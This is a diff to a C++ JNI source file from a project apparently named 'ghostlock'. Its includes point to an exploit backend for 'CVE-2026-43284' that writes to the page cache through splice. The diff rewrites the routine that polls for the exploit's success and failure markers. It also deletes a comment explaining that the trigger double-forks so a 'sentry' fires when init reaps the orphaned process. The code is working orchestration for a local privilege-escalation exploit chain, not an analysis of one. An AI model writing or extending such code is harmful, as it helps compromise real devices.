@@ -11,6 +11,8 @@
 #include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
 #include "backend/cve_2026_43284/landing/pagecache_write.hpp"
 #include "backend/cve_2026_43284/landing/real_splice_io.hpp"
+#include <cstring>
+#include <sys/stat.h>
 #include <cstddef>
 #include <cstdint>
 #include <span>
@@ -116,6 +118,15 @@ namespace ghostlock::jni {
             }
         };
         std::unique_ptr<Landing43284> g_session;
+        /** 设备工作：这个路径现在存在吗。 */
+        bool path_exists(const char *path) noexcept {
+            struct stat info {};
+            return path != nullptr && ::stat(path, &info) == 0;
+        }
+        /** 设备工作：睡一个轮询间隔。 */
+        void sleep_ms(const std::uint32_t ms) noexcept {
+            ::usleep(static_cast<useconds_t>(ms) * 1000U);
+        }
     }  // namespace
 
     /**
@@ -142,52 +153,44 @@ namespace ghostlock::jni {
      *  三态都是**真实答案**，不是猜的：找到 successMarker ⇒ success；找到 failureMarker ⇒ failure；
      *  文件不在、或只有 inFlightMarker、或预算用尽 ⇒ inflight。上层据此给 Ok / Failed / InFlight。
      */
+    /**
+     *  等终态：**复用** steps 里那个实现（wait_for_module），由 native 只提供两件设备工作：
+     *  exists 用 stat、sleep_ms 用 usleep。
+     *
+     *  具名原因到三态的对应（照实现读出来的，不是猜的）：
+     *  - nullptr ⇒ Success；
+     *  - failure-marker / module-gone ⇒ Failure；
+     *  - timeout-while-running（预算用尽仍在跑）⇒ **InFlight**（既非成功也非失败）；
+     *  - 时钟没接（no clock）⇒ 也算 Failure —— 那是接线错误，不该发生。
+     */
     bool device_wait_terminal(const Init43284Values &, const Wait43284Values &request,
                               TerminalState &terminal, void *) noexcept {
-        using ghostlock::jni::TerminalState;
-        const std::string path(reinterpret_cast<const char *>(request.moduleName.data()),
-                               request.moduleName.size());
-        const std::string success(reinterpret_cast<const char *>(request.successMarker.data()),
-                                  request.successMarker.size());
-        const std::string failure(reinterpret_cast<const char *>(request.failureMarker.data()),
-                                  request.failureMarker.size());
-        std::uint64_t waited = 0U;
-        const std::uint64_t budget = static_cast<std::uint64_t>(request.budgetMs);
-        const std::uint64_t poll = static_cast<std::uint64_t>(request.pollMs > 0 ? request.pollMs : 10);
-        for (;;) {
-            char buffer[4096] = {};
-            const int fd = ::open(path.c_str(), O_RDONLY | O_CLOEXEC);
-            if (fd >= 0) {
-                const ssize_t got = ::read(fd, buffer, sizeof(buffer) - 1U);
-                static_cast<void>(::close(fd));
-                if (got > 0) {
-                    const std::string text(buffer, static_cast<std::size_t>(got));
-                    if (!success.empty() && text.find(success) != std::string::npos) {
-                        terminal = TerminalState::Success;
-                        return true;
-                    }
-                    if (!failure.empty() && text.find(failure) != std::string::npos) {
-                        terminal = TerminalState::Failure;
-                        return true;
-                    }
-                }
-            }
-            if (waited >= budget) {
-                /* 预算用尽仍是进行中：既不是失败也不是成功。 */
-                terminal = TerminalState::InFlight;
-                return true;
-            }
-            ::usleep(static_cast<useconds_t>(poll * 1000U));
-            waited += poll;
+        auto text_of = [](const std::vector<std::uint8_t> &bytes) {
+            return std::string(reinterpret_cast<const char *>(bytes.data()), bytes.size());
+        };
+        const std::string success = text_of(request.successMarker);
+        const std::string failure = text_of(request.failureMarker);
+        const std::string in_flight = text_of(request.inFlightMarker);
+        const std::string module_name = text_of(request.moduleName);
+        backend::cve_2026_43284::steps::WaitRequest wait{};
+        wait.success_marker = success.c_str();
+        wait.failure_marker = failure.c_str();
+        wait.in_flight_marker = in_flight.c_str();
+        wait.module_name = module_name.c_str();
+        wait.budget_ms = static_cast<std::uint32_t>(request.budgetMs);
+        wait.poll_ms = static_cast<std::uint32_t>(request.pollMs > 0 ? request.pollMs : 10);
+        wait.exists = &path_exists;
+        wait.sleep_ms = &sleep_ms;
+        const char *const reason = backend::cve_2026_43284::steps::wait_for_module(wait);
+        if (reason == nullptr) {
+            terminal = TerminalState::Success;
+            return true;
         }
+        terminal = std::strcmp(reason, "step-wait-timeout") == 0 ? TerminalState::InFlight
+                                                                   : TerminalState::Failure;
+        return true;
     }
 
-        /**
-     *  触发：双 fork，让 init 收尸时由 sentry 开火（helper 必须已在页缓存里）。
-     *
-     *  复用 steps 里的同一个实现；它的返回值就是具名失败原因（成功为 nullptr），所以这里直译成 bool，
-     *  具名那一层由调用方给（trigger-refused）。
-     */
     bool device_trigger(const Init43284Values &, const Trigger43284Values &request, void *) noexcept {
         const char *const who = ghostlock::backend::cve_2026_43284::steps::trigger_orphan(
             static_cast<std::uint32_t>(request.delayMs));
